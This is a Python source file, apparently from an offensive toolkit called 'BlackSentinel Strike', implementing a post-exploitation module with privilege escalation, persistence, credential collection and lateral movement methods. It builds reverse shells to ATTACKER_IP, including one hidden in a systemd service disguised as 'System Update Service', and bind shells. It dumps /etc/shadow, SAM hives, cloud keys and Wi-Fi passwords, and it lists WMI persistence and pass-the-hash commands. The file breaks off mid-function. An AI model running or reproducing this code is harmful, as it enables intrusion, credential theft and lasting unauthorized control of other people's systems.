#!/usr/bin/env python3
"""
Copyright (c) 2024-2025 BlackSentinel Strike - All Rights Reserved
Post-Exploitation Advanced Module
"""

import subprocess
import platform


class PostExploitationAdvanced:
    """Advanced Post-Exploitation Module for BlackSentinel Strike"""

    def __init__(self, callback=None):
        self.callback = callback
        self.exfiltrated_data = []
        self.persistence_entries = []
        self.pivot_sessions = []

    def log(self, message, level="info"):
        if self.callback:
            self.callback(message, level)

    def run_command(self, cmd, timeout=30):
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=timeout
            )
            return result.stdout.strip()
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"

    # ═══════════════════════════════════════════════════════════
    # PRIVILEGE ESCALATION (10 METHODS)
    # ═══════════════════════════════════════════════════════════

    def pe_linux_suid_binaries(self, target="localhost"):
        self.log(f"[PrivEsc] Scanning SUID binaries on {target}", "info")
        try:
            output = self.run_command("find / -perm -4000 -type f 2>/dev/null")
            vuln_suids = []
            dangerous = ["nmap", "vim", "find", "bash", "sh", "python", "perl",
                         "ruby", "wget", "curl", "cp", "mv", "env", "awk",
                         "less", "more", "man", "ftp", "socat", "tee"]
            for line in output.split("\n"):
                if line.strip():
                    binary = line.split("/")[-1].lower()
                    if binary in dangerous:
                        vuln_suids.append(line.strip())
            return f"SUID Binaries Found:\n{output}\n\nPotentially Exploitable:\n" + "\n".join(vuln_suids) if vuln_suids else f"SUID Binaries:\n{output}"
        except Exception as e:
            return f"Error scanning SUID binaries: {str(e)}"

    def pe_linux_sudo_misconfig(self, target="localhost"):
        self.log(f"[PrivEsc] Checking sudo misconfigurations on {target}", "info")
        try:
            output = self.run_command("sudo -l 2>/dev/null")
            risky = []
            dangerous_cmds = ["(ALL)", "(root)", "NOPASSWD", "/bin/bash",
                              "/bin/sh", "/usr/bin/python", "/usr/bin/perl",
                              "/usr/bin/ruby", "/usr/bin/env", "/usr/bin/find",
                              "/usr/bin/vim", "/usr/bin/nmap", "/usr/bin/awk",
                              "/usr/bin/less", "/usr/bin/man", "/usr/bin/cp",
                              "/usr/bin/mv", "/usr/bin/wget", "/usr/bin/curl"]
            for line in output.split("\n"):
                for cmd in dangerous_cmds:
                    if cmd.lower() in line.lower():
                        risky.append(line.strip())
                        break
            result = f"Sudo Permissions:\n{output}"
            if risky:
                result += "\n\n[RISKY] Potentially exploitable sudo entries:\n" + "\n".join(risky)
            return result
        except Exception as e:
            return f"Error checking sudo: {str(e)}"

    def pe_linux_kernel_exploits(self, target="localhost"):
        self.log(f"[PrivEsc] Checking kernel version for known exploits on {target}", "info")
        try:
            kernel = self.run_command("uname -r")
            os_info = self.run_command("cat /etc/os-release 2>/dev/null | head -5")
            gcc = self.run_command("which gcc 2>/dev/null")
            exploits_db = {
                "DirtyCow": ["4.4.0", "4.8.0", "4.10.0"],
                "DirtyPipe": ["5.8.0", "5.10.0", "5.15.0", "5.16.0"],
                "PwnKit": ["pkexec"],
                "BaronSamedit": ["sudo", "1.8"],
                "Nightmare": ["polkit"],
            }
            potential = []
            for exploit, versions in exploits_db.items():
                for v in versions:
                    if v in kernel or v in os_info:
                        potential.append(exploit)
            result = f"Kernel: {kernel}\nOS Info:\n{os_info}\nGCC: {gcc or 'Not found'}"
            if potential:
                result += "\n\n[!] Potential kernel exploits: " + ", ".join(potential)
            else:
                result += "\n\n[+] No obvious kernel exploits detected"
            return result
        except Exception as e:
            return f"Error checking kernel exploits: {str(e)}"

    def pe_linux_cron_abuse(self, target="localhost"):
        self.log(f"[PrivEsc] Checking cron jobs for abuse on {target}", "info")
        try:
            system_cron = self.run_command("cat /etc/crontab 2>/dev/null")
            cron_dirs = self.run_command("ls -la /etc/cron.d/ 2>/dev/null")
            user_crons = self.run_command("for i in $(ls /var/spool/cron/crontabs/ 2>/dev/null); do echo \"=== $i ===\"; cat /var/spool/cron/crontabs/$i 2>/dev/null; done")
            writable = self.run_command("find /etc/cron* -writable -type f 2>/dev/null")
            result = f"System Crontab:\n{system_cron}\n\nCron.d:\n{cron_dirs}\n\nUser Crons:\n{user_crons}"
            if writable.strip():
                result += f"\n\n[!] WRITABLE CRON FILES:\n{writable}"
            return result
        except Exception as e:
            return f"Error checking cron jobs: {str(e)}"

    def pe_linux_writable_etc_passwd(self, target="localhost"):
        self.log(f"[PrivEsc] Checking /etc/passwd writability on {target}", "info")
        try:
            writable = self.run_command("ls -la /etc/passwd 2>/dev/null")
            world_writable = self.run_command("test -w /etc/passwd && echo 'WRITABLE' || echo 'NOT WRITABLE'")
            result = f"/etc/passwd permissions: {writable}\nWrite access: {world_writable}"
            if "WRITABLE" in world_writable and "NOT" not in world_writable:
                result += "\n[!] /etc/passwd is writable - can create root user!"
                result += "\nExploit: echo 'root2:$(openssl passwd -1 -salt salt password):0:0:root:/root:/bin/bash' >> /etc/passwd"
            return result
        except Exception as e:
            return f"Error checking /etc/passwd: {str(e)}"

    def pe_windows_token_impersonation(self, target="localhost"):
        self.log(f"[PrivEsc] Checking token impersonation on {target}", "info")
        try:
            whoami = self.run_command("whoami /priv 2>/dev/null")
            tokens = []
            if "SeImpersonatePrivilege" in whoami or "SeAssignPrimaryTokenPrivilege" in whoami:
                tokens.append("SeImpersonatePrivilege - Potato attack possible")
                tokens.append("Use: JuicyPotato, PrintSpoofer, GodPotato")
            if "SeDebugPrivilege" in whoami:
                tokens.append("SeDebugPrivilege - Can debug other processes")
            if "SeTcbPrivilege" in whoami:
                tokens.append("SeTcbPrivilege - Acts as part of OS")
            if "SeBackupPrivilege" in whoami:
                tokens.append("SeBackupPrivilege - Can backup files")
            result = f"Token Privileges:\n{whoami}"
            if tokens:
                result += "\n\n[!] Exploitable Tokens:\n" + "\n".join(tokens)
            return result
        except Exception as e:
            return f"Error checking tokens: {str(e)}"

    def pe_windows_service_abuse(self, target="localhost"):
        self.log(f"[PrivEsc] Checking vulnerable services on {target}", "info")
        try:
            services = self.run_command('wmic service get name,pathname,startmode 2>/dev/null')
            unquoted = []
            for line in services.split("\n"):
                if line.strip() and " " in line and "C:\\" in line and '"' not in line:
                    unquoted.append(line.strip())
            weak_perms = self.run_command('sc query type= service state= all 2>/dev/null | findstr /i "SERVICE_NAME"')
            result = f"Services:\n{services}"
            if unquoted:
                result += "\n\n[!] UNQUOTED SERVICE PATHS:\n" + "\n".join(unquoted)
                result += "\n[!] Exploit with: msfvenom -f exe SERVICE_PATH=..."
            return result
        except Exception as e:
            return f"Error checking services: {str(e)}"

    def pe_windows_registry_autorun(self, target="localhost"):
        self.log(f"[PrivEsc] Checking autorun entries on {target}", "info")
        try:
            autorun1 = self.run_command('reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null')
            autorun2 = self.run_command('reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null')
            scheduled = self.run_command('schtasks /query /fo LIST 2>/dev/null')
            startup = self.run_command('dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>/dev/null')
            result = (f"HKLM Autorun:\n{autorun1}\n\nHKCU Autorun:\n{autorun2}\n"
                      f"\nScheduled Tasks:\n{scheduled}\n\nStartup:\n{startup}")
            return result
        except Exception as e:
            return f"Error checking autorun: {str(e)}"

    def pe_windows_dll_hijack(self, target="localhost"):
        self.log(f"[PrivEsc] Checking DLL hijack opportunities on {target}", "info")
        try:
            missing_dlls = self.run_command(
                'powershell -Command "Get-Process | ForEach-Object { '
                'try { $_.Modules | ForEach-Object { $_.FileName } } catch {} }" 2>/dev/null'
            )
            path_dirs = self.run_command('echo %PATH%')
            writable = self.run_command(
                'for /f "tokens=*" %i in (\'echo %PATH%\') do @icacls "%i" 2>nul | findstr /i "F" | findstr /i "Everyone" >nul && echo %i'
            )
            result = f"Loaded DLLs:\n{missing_dlls}\n\nPATH Directories:\n{path_dirs}"
            if writable.strip():
                result += f"\n\n[!] WRITABLE PATH DIRECTORIES (DLL hijack):\n{writable}"
            return result
        except Exception as e:
            return f"Error checking DLL hijack: {str(e)}"

    def pe_windows_uac_bypass(self, target="localhost"):
        self.log(f"[PrivEsc] Checking UAC bypass possibilities on {target}", "info")
        try:
            uac_level = self.run_command(
                'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA 2>/dev/null'
            )
            consent = self.run_command(
                'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin 2>/dev/null'
            )
            fodhelper = self.run_command(
                'reg query HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command 2>/dev/null'
            )
            eventvwr = self.run_command(
                'reg query HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command 2>/dev/null'
            )
            result = (f"UAC Settings:\n{uac_level}\n\nConsent Prompt:\n{consent}\n"
                      f"\nFodhelper check:\n{fodhelper}\n\nEventvwr check:\n{eventvwr}")
            if "0x1" not in uac_level:
                result += "\n\n[!] UAC appears to be enabled - bypass may be possible"
            return result
        except Exception as e:
            return f"Error checking UAC: {str(e)}"

    # ═══════════════════════════════════════════════════════════
    # PERSISTENCE (10 METHODS)
    # ═══════════════════════════════════════════════════════════

    def persist_linux_crontab_backdoor(self, target="localhost"):
        self.log(f"[Persistence] Installing crontab backdoor on {target}", "info")
        try:
            current = self.run_command("crontab -l 2>/dev/null")
            reverse_shell = "*/5 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
            result = f"Current crontab:\n{current}\n\n"
            result += f"Payload to add for persistence:\n{reverse_shell}\n"
            result += "Use: (crontab -l 2>/dev/null; echo '*/5 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1') | crontab -"
            return result
        except Exception as e:
            return f"Error installing crontab backdoor: {str(e)}"

    def persist_linux_ssh_keys(self, target="localhost"):
        self.log(f"[Persistence] Installing SSH persistence on {target}", "info")
        try:
            ssh_dir = self.run_command("ls -la ~/.ssh/ 2>/dev/null")
            authorized = self.run_command("cat ~/.ssh/authorized_keys 2>/dev/null")
            result = f"SSH Directory:\n{ssh_dir}\n\nAuthorized Keys:\n{authorized}\n"
            result += "\nTo add persistence:\n"
            result += "mkdir -p ~/.ssh && echo 'PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
            return result
        except Exception as e:
            return f"Error checking SSH persistence: {str(e)}"

    def persist_linux_systemd_service(self, target="localhost"):
        self.log(f"[Persistence] Creating systemd service on {target}", "info")
        try:
            services = self.run_command("systemctl list-unit-files --type=service 2>/dev/null | head -20")
            service_name = "bs-updater"
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1; sleep 60; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"""
            result = f"Existing services:\n{services}\n\n"
            result += f"Service file to create at /etc/systemd/system/{service_name}.service:\n{service_content}\n"
            result += f"\nEnable with: systemctl enable {service_name} && systemctl start {service_name}"
            return result
        except Exception as e:
            return f"Error creating systemd service: {str(e)}"

    def persist_linux_rc_local(self, target="localhost"):
        self.log(f"[Persistence] Checking rc.local persistence on {target}", "info")
        try:
            rc_local = self.run_command("cat /etc/rc.local 2>/dev/null")
            rc_d = self.run_command("ls /etc/rc.d/rc.local 2>/dev/null")
            init_d = self.run_command("ls /etc/init.d/ 2>/dev/null")
            result = f"rc.local:\n{rc_local}\n\nrc.d:\n{rc_d}\n\ninit.d:\n{init_d}\n"
            result += "\nTo persist via rc.local, add reverse shell command before 'exit 0'"
            return result
        except Exception as e:
            return f"Error checking rc.local: {str(e)}"

    def persist_windows_registry_run_key(self, target="localhost"):
        self.log(f"[Persistence] Creating Windows registry Run key on {target}", "info")
        try:
            current = self.run_command(
                'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null'
            )
            payload_path = "%APPDATA%\\Microsoft\\Windows\\start.exe"
            result = f"Current HKCU Run keys:\n{current}\n\n"
            result += f"Payload path: {payload_path}\n"
            result += f"\nRegistry command:\n"
            result += f'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "SystemUpdate" /t REG_SZ /d "{payload_path}" /f'
            return result
        except Exception as e:
            return f"Error creating registry persistence: {str(e)}"

    def persist_windows_scheduled_task(self, target="localhost"):
        self.log(f"[Persistence] Creating scheduled task on {target}", "info")
        try:
            tasks = self.run_command("schtasks /query /fo TABLE 2>/dev/null | head -20")
            task_name = "WindowsUpdateService"
            result = f"Existing scheduled tasks:\n{tasks}\n\n"
            result += f"Command to create persistent task:\n"
            result += f'schtasks /create /tn "{task_name}" /tr "C:\\Windows\\System32\\cmd.exe /c payload.exe" /sc ONLOGON /ru SYSTEM'
            result += f'\nOr with higher stealth:\n'
            result += f'schtasks /create /tn "{task_name}" /tr "C:\\Windows\\System32\\cmd.exe /c payload.exe" /sc DAILY /st 09:00'
            return result
        except Exception as e:
            return f"Error creating scheduled task: {str(e)}"

    def persist_windows_wmi_event(self, target="localhost"):
        self.log(f"[Persistence] Creating WMI event subscription on {target}", "info")
        try:
            wmi_check = self.run_command(
                'wmic /namespace:\\\\root\\subscription qEventConsumer 2>/dev/null'
            )
            result = f"WMI Event Consumers:\n{wmi_check}\n\n"
            result += "WMI Persistence Commands:\n"
            result += "1. Create filter:\n"
            result += 'wmic /namespace:\\\\root\\subscription path __EventFilter create name="bs_filter",EventNameSpace="root\\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"\n'
            result += "\n2. Create consumer:\n"
            result += 'wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer create name="bs_consumer",CommandLineTemplate="cmd.exe /c payload.exe"\n'
            result += "\n3. Bind filter to consumer:\n"
            result += 'wmic /namespace:\\\\root\\subscription path __FilterToConsumerBinding create Filter="__Filter.path=\\"bs_filter\\"",Consumer="CommandLineEventConsumer.path=\\"bs_consumer\\""'
            return result
        except Exception as e:
            return f"Error creating WMI event: {str(e)}"

    def persist_linux_bind_shell(self, target="localhost"):
        self.log(f"[Persistence] Setting up bind shell on {target}", "info")
        try:
            listening = self.run_command("netstat -tlnp 2>/dev/null | grep LISTEN")
            result = f"Currently listening ports:\n{listening}\n\n"
            result += "Bind shell options:\n"
            result += "1. nc -l -p 9999 -e /bin/bash\n"
            result += "2. python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",9999));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n"
            result += "3. socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
            return result
        except Exception as e:
            return f"Error setting up bind shell: {str(e)}"

    def persist_linux_motd_backdoor(self, target="localhost"):
        self.log(f"[Persistence] Installing MOTD backdoor on {target}", "info")
        try:
            motd_check = self.run_command("ls -la /etc/update-motd.d/ 2>/dev/null")
            writable = self.run_command("test -w /etc/update-motd.d/ && echo 'WRITABLE' || echo 'NOT WRITABLE'")
            result = f"MOTD scripts:\n{motd_check}\nWrite access: {writable}\n"
            if "WRITABLE" in writable:
                result += "\n[!] /etc/update-motd.d/ is writable!"
                result += "\nAdd reverse shell to numbered script for persistence on SSH login"
            return result
        except Exception as e:
            return f"Error checking MOTD backdoor: {str(e)}"

    def persist_linux_pam_module(self, target="localhost"):
        self.log(f"[Persistence] Checking PAM module persistence on {target}", "info")
        try:
            pam_config = self.run_command("cat /etc/pam.d/common-auth 2>/dev/null")
            pam_files = self.run_command("ls -la /lib/security/ 2>/dev/null || ls -la /lib/x86_64-linux-gnu/security/ 2>/dev/null")
            result = f"PAM Configuration:\n{pam_config}\n\nPAM Modules:\n{pam_files}\n"
            result += "\nPAM backdoor technique:"
            result += "\n1. Modify /etc/pam.d/common-auth to include pam_permit.so"
            result += "\n2. Create malicious .so module in /lib/security/"
            result += "\n3. Set auth required pam_permit.so as first line in auth stack"
            return result
        except Exception as e:
            return f"Error checking PAM modules: {str(e)}"

    # ═══════════════════════════════════════════════════════════
    # DATA EXFILTRATION (10 METHODS)
    # ═══════════════════════════════════════════════════════════

    def exfil_sensitive_files(self, target="localhost"):
        self.log(f"[Exfil] Collecting sensitive files from {target}", "info")
        try:
            linux_files = [
                "/etc/passwd", "/etc/shadow", "/etc/ssh/ssh_host_rsa_key",
                "/root/.bash_history", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
                "/etc/crontab", "/etc/sudoers", "/var/log/auth.log",
                "/etc/ssh/sshd_config", "/root/.gnupg/secring.gpg"
            ]
            windows_files = [
                "C:\\Windows\\System32\\config\\SAM", "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Users\\*\\Documents\\*.key", "C:\\Users\\*\\.ssh\\id_rsa",
                "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*",
                "C:\\inetpub\\web.config", "C:\\Windows\\php.ini"
            ]
            found = []
            for f in linux_files + windows_files:
                check = self.run_command(f'test -f "{f}" && echo "EXISTS:{f}" 2>/dev/null')
                if "EXISTS" in check:
                    found.append(f)
            return f"Sensitive files found:\n" + "\n".join(found) if found else "No sensitive files found in common locations"
        except Exception as e:
            return f"Error collecting sensitive files: {str(e)}"

    def exfil_wifi_credentials(self, target="localhost"):
        self.log(f"[Exfil] Extracting WiFi credentials from {target}", "info")
        try:
            profiles = self.run_command('netsh wlan show profiles 2>/dev/null')
            credentials = self.run_command(
                'for /f "tokens=2 delims=:" %i in (\'netsh wlan show profiles ^| findstr "All User Profile"\') do @netsh wlan show profile name="%i" key=clear 2>/dev/null | findstr "Key Content"'
            )
            linux_profiles = self.run_command('ls /etc/NetworkManager/system-connections/ 2>/dev/null')
            linux_creds = self.run_command('for f in /etc/NetworkManager/system-connections/*; do echo "=== $f ==="; cat "$f" 2>/dev/null | grep -i psk; done')
            result = f"Windows Profiles:\n{profiles}\n\nCredentials:\n{credentials}"
            if linux_profiles:
                result += f"\n\nLinux Profiles:\n{linux_profiles}\nCredentials:\n{linux_creds}"
            return result
        except Exception as e:
            return f"Error extracting WiFi credentials: {str(e)}"

    def exfil_browser_data(self, target="localhost"):
        self.log(f"[Exfil] Extracting browser data from {target}", "info")
        try:
            chrome_cookies = self.run_command(
                'find ~/ -path "*/.config/google-chrome/Default/Cookies" 2>/dev/null'
            )
            firefox_profiles = self.run_command(
                'find ~/ -path "*/.mozilla/firefox/*.default*/cookies.sqlite" 2>/dev/null'
            )
            chrome_history = self.run_command(
                'find ~/ -path "*/.config/google-chrome/Default/History" 2>/dev/null'
            )
            firefox_history = self.run_command(
                'find ~/ -path "*/.mozilla/firefox/*.default*/places.sqlite" 2>/dev/null'
            )
            result = f"Chrome Cookies:\n{chrome_cookies}\nFirefox Cookies:\n{firefox_profiles}"
            result += f"\nChrome History:\n{chrome_history}\nFirefox History:\n{firefox_history}"
            if chrome_cookies or firefox_profiles:
                result += "\n\n[!] Browser data found - copy SQLite databases for offline analysis"
            return result
        except Exception as e:
            return f"Error extracting browser data: {str(e)}"

    def exfil_password_hashes(self, target="localhost"):
        self.log(f"[Exfil] Extracting password hashes from {target}", "info")
        try:
            linux_hashes = self.run_command("cat /etc/shadow 2>/dev/null")
            windows_hashes = self.run_command(
                'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive 2>/dev/null && '
                'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive 2>/dev/null'
            )
            lsa_secrets = self.run_command(
                'reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive 2>/dev/null'
            )
            result = f"Linux /etc/shadow:\n{linux_hashes}\n\n"
            result += f"Windows SAM backup:\n{windows_hashes}\n"
            result += f"Windows LSA Secrets:\n{lsa_secrets}\n"
            if linux_hashes:
                result += "\n[!] Use hashcat or john to crack extracted hashes"
            return result
        except Exception as e:
            return f"Error extracting password hashes: {str(e)}"

    def exfil_database_dump(self, target="localhost"):
        self.log(f"[Exfil] Attempting database dumps from {target}", "info")
        try:
            mysql_check = self.run_command("which mysql 2>/dev/null")
            psql_check = self.run_command("which psql 2>/dev/null")
            sqlite_check = self.run_command("find / -name '*.db' -o -name '*.sqlite' 2>/dev/null | head -20")
            db_files = self.run_command("find / -name '*.sql' -o -name '*.sqlite3' 2>/dev/null | head -20")
            result = f"MySQL: {mysql_check}\nPostgreSQL: {psql_check}\n"
            result += f"SQLite databases:\n{sqlite_check}\n\nSQL files:\n{db_files}\n"
            result += "\nDump commands:"
            result += "\nmysqldump --all-databases --user=root --password=PASSWORD > dump.sql"
            result += "\npg_dumpall -U postgres > dump.sql"
            result += "\nsqlite3 database.db .dump > dump.sql"
            return result
        except Exception as e:
            return f"Error attempting database dump: {str(e)}"

    def exfil_ssh_keys(self, target="localhost"):
        self.log(f"[Exfil] Extracting SSH keys from {target}", "info")
        try:
            ssh_keys = self.run_command("find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null")
            ssh_config = self.run_command("find / -name 'config' -path '*/.ssh/*' 2>/dev/null")
            known_hosts = self.run_command("find / -name 'known_hosts' -path '*/.ssh/*' 2>/dev/null")
            authorized = self.run_command("find / -name 'authorized_keys' 2>/dev/null")
            result = f"Private Keys:\n{ssh_keys}\nSSH Configs:\n{ssh_config}\n"
            result += f"Known Hosts:\n{known_hosts}\nAuthorized Keys:\n{authorized}"
            if ssh_keys.strip():
                result += "\n\n[!] Private SSH keys found - use for lateral movement"
            return result
        except Exception as e:
            return f"Error extracting SSH keys: {str(e)}"

    def exfil_cloud_credentials(self, target="localhost"):
        self.log(f"[Exfil] Extracting cloud credentials from {target}", "info")
        try:
            aws_keys = self.run_command(
                'cat ~/.aws/credentials 2>/dev/null; '
                'env | grep -i AWS 2>/dev/null'
            )
            azure_profile = self.run_command(
                'cat ~/.azure/accessTokens.json 2>/dev/null; '
                'cat ~/.azure/azureProfile.json 2>/dev/null'
            )
            gcp_keys = self.run_command(
                'cat ~/.config/gcloud/credentials.db 2>/dev/null; '
                'cat ~/.config/gcloud/properties 2>/dev/null'
            )
            docker_env = self.run_command(
                'cat /root/.docker/config.json 2>/dev/null; '
                'env | grep -i DOCKER 2>/dev/null'
            )
            result = f"AWS:\n{aws_keys}\n\nAzure:\n{azure_profile}\n"
            result += f"GCP:\n{gcp_keys}\n\nDocker:\n{docker_env}"
            if any([aws_keys, azure_profile, gcp_keys, docker_env]):
                result += "\n\n[!] Cloud credentials found!"
            return result
        except Exception as e:
            return f"Error extracting cloud credentials: {str(e)}"

    def exfil_memory_dump(self, target="localhost"):
        self.log(f"[Exfil] Attempting memory dump from {target}", "info")
        try:
            procdump = self.run_command("which procdump 2>/dev/null || which procdump64 2>/dev/null")
            dd_check = self.run_command("which dd 2>/dev/null")
            memory_files = self.run_command("ls /proc/*/mem 2>/dev/null | head -5")
            result = f"Procdump: {procdump}\ndd: {dd_check}\n"
            result += f"Memory files:\n{memory_files}\n"
            result += "\nMemory dump options:"
            result += "\n1. dd if=/dev/mem of=/tmp/memory.dump bs=1M"
            result += "\n2. /usr/lib/foremost/foremost -t all -i /dev/sda -o /tmp/forensic"
            result += "\n3. Volatility: volatility -f memory.dump imageinfo"
            return result
        except Exception as e:
            return f"Error attempting memory dump: {str(e)}"

    def exfil_network_captures(self, target="localhost"):
        self.log(f"[Exfil] Extracting network captures from {target}", "info")
        try:
            pcap_files = self.run_command("find / -name '*.pcap' -o -name '*.pcapng' 2>/dev/null | head -20")
            tcpdump = self.run_command("which tcpdump 2>/dev/null")
            tshark = self.run_command("which tshark 2>/dev/null")
            interfaces = self.run_command("ip link show 2>/dev/null || ifconfig 2>/dev/null")
            result = f"PCAP files:\n{pcap_files}\n\nTools:\ntcpdump: {tcpdump}\ntshark: {tshark}\n"
            result += f"\nInterfaces:\n{interfaces}"
            result += "\n\nCapture commands:"
            result += "\ntcpdump -i eth0 -w /tmp/capture.pcap"
            result += "\ntshark -i eth0 -a duration:300 -w /tmp/capture.pcapng"
            return result
        except Exception as e:
            return f"Error extracting network captures: {str(e)}"

    def exfil_ssh_tunnel_data(self, target="localhost"):
        self.log(f"[Exfil] Extracting SSH tunnel data from {target}", "info")
        try:
            ssh_sessions = self.run_command("ps aux | grep ssh 2>/dev/null")
            ssh_config = self.run_command("cat ~/.ssh/config 2>/dev/null")
            ssh_agent = self.run_command("ssh-add -l 2>/dev/null")
            result = f"SSH Sessions:\n{ssh_sessions}\n\nSSH Config:\n{ssh_config}\n\nSSH Agent Keys:\n{ssh_agent}"
            if ssh_sessions.strip():
                result += "\n\n[!] Active SSH sessions found - potential for tunneling/pivoting"
            return result
        except Exception as e:
            return f"Error extracting SSH tunnel data: {str(e)}"

    def exfil_etc_shadow_bruteforce(self, target="localhost"):
        self.log(f"[Exfil] Extracting /etc/shadow for offline cracking on {target}", "info")
        try:
            shadow = self.run_command("cat /etc/shadow 2>/dev/null")
            users = self.run_command("awk -F: 'NF>1 && $2!=\"*\" && $2!=\"!\" {print $1}' /etc/shadow 2>/dev/null")
            result = f"/etc/shadow:\n{shadow}\n\nCrackable users:\n{users}"
            if shadow.strip():
                result += "\n\nOffline cracking commands:"
                result += "\nunshadow /etc/passwd /etc/shadow > hashes.txt"
                result += "\njohn --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
                result += "\nhashcat -m 1800 hashes.txt rockyou.txt"
            return result
        except Exception as e:
            return f"Error extracting shadow: {str(e)}"

    # ═══════════════════════════════════════════════════════════
    # LATERAL MOVEMENT (10 METHODS)
    # ═══════════════════════════════════════════════════════════

    def lateral_smb_shares(self, target="localhost"):
        self.log(f"[Lateral] Enumerating SMB shares on {target}", "info")
        try:
            shares = self.run_command("net share 2>/dev/null")
            smb_client = self.run_command(f"smbclient -L {target} -N 2>/dev/null")
            smb_enum = self.run_command("enum4linux -a 2>/dev/null")
            null_session = self.run_command(f"smbclient -L {target} -U '' -N 2>/dev/null")
            result = f"Local Shares:\n{shares}\n\nSMB Client:\n{smb_client}"
            result += f"\n\nEnum4linux:\n{smb_enum}\n\nNull Session:\n{null_session}"
            if "Disk" in smb_client or "Disk" in null_session:
                result += "\n\n[!] Accessible shares found - enumerate contents for sensitive data"
            return result
        except Exception as e:
            return f"Error enumerating SMB shares: {str(e)}"

    def lateral_psexec(self, target="localhost"):
        self.log(f"[Lateral] Testing PsExec lateral movement to {target}", "info")
        try:
            psexec = self.run_command("which psexec.py 2>/dev/null || which psexec 2>/dev/null")
            impacket = self.run_command("which wmiexec.py 2>/dev/null || which atexec.py 2>/dev/null")
            result = f"PsExec tools available:\npsexec: {psexec}\nImpacket: {impacket}\n"
            result += "\nLateral movement commands:"
            result += "\npsexec.py DOMAIN/user:password@TARGET cmd.exe"
            result += "\nwmiexec.py DOMAIN/user:password@TARGET cmd.exe"
            result += "\natexec.py DOMAIN/user:password@TARGET 'command'"
            result += "\nimpacket-smbexec DOMAIN/user:password@TARGET"
            return result
        except Exception as e:
            return f"Error testing PsExec: {str(e)}"

    def lateral_wmi_execution(self, target="localhost"):
        self.log(f"[Lateral] Testing WMI execution to {target}", "info")
        try:
            wmic = self.run_command("which wmic 2>/dev/null")
            wmi_check = self.run_command(f"wmic /node:{target} process call create 'cmd.exe' 2>/dev/null")
            result = f"WMI available: {wmic}\n\nWMI Execution test:\n{wmi_check}"
            result += "\n\nWMI Lateral Movement:"
            result += "\nwmic /node:TARGET process call create 'powershell -ep bypass -c IEX(...)'"
            result += "\nOr with Impacket:"
            result += "\nwmiexec.py DOMAIN/user:password@TARGET"
            return result
        except Exception as e:
            return f"Error testing WMI execution: {str(e)}"

    def lateral_winrm_sessions(self, target="localhost"):
        self.log(f"[Lateral] Checking WinRM sessions to {target}", "info")
        try:
            winrm_check = self.run_command("winrm enumerate winrm/config/service 2>/dev/null")
            trusted_hosts = self.run_command("winrm get winrm/config/client 2>/dev/null")
            result = f"WinRM Configuration:\n{winrm_check}\n\nTrusted Hosts:\n{trusted_hosts}"
            result += "\n\nWinRM Lateral Movement:"
            result += "\nEnter-PSSession -ComputerName TARGET -Credential $cred"
            result += "\nInvoke-Command -ComputerName TARGET -ScriptBlock {whoami}"
            result += "\nNew-PSSession -ComputerName TARGET"
            return result
        except Exception as e:
            return f"Error checking WinRM: {str(e)}"

    def lateral_ssh_tunnel_pivot(self, target="localhost"):
        self.log(f"[Lateral] Setting up SSH pivot tunnel to {target}", "info")
        try:
            ssh_config = self.run_command("cat ~/.ssh/config 2>/dev/null")
            ssh_keys = self.run_command("ls -la ~/.ssh/ 2>/dev/null")
            proxychains = self.run_command("cat /etc/proxychains.conf 2>/dev/null | tail -10")
            result = f"SSH Config:\n{ssh_config}\n\nSSH Keys:\n{ssh_keys}\n"
            result += f"\nProxychains:\n{proxychains}\n"
            result += "\nSSH Pivot Commands:"
            result += "\nssh -D 1080 user@TARGET"
            result += "\nssh -L 8080:internal_host:80 user@TARGET"
            result += "\nssh -R 9999:localhost:4444 user@TARGET"
            result += "\nssh -N -f -w 0:0 user@TARGET"
            return result
        except Exception as e:
            return f"Error setting up SSH pivot: {str(e)}"

    def lateral_pass_the_hash(self, target="localhost"):
        self.log(f"[Lateral] Testing Pass-the-Hash to {target}", "info")
        try:
            mimikatz = self.run_command("which mimikatz 2>/dev/null")
            impacket = self.run_command("which psexec.py 2>/dev/null")
            result = f"Mimikatz: {mimikatz}\nImpacket: {impacket}\n"
            result += "\nPass-the-Hash Commands:"
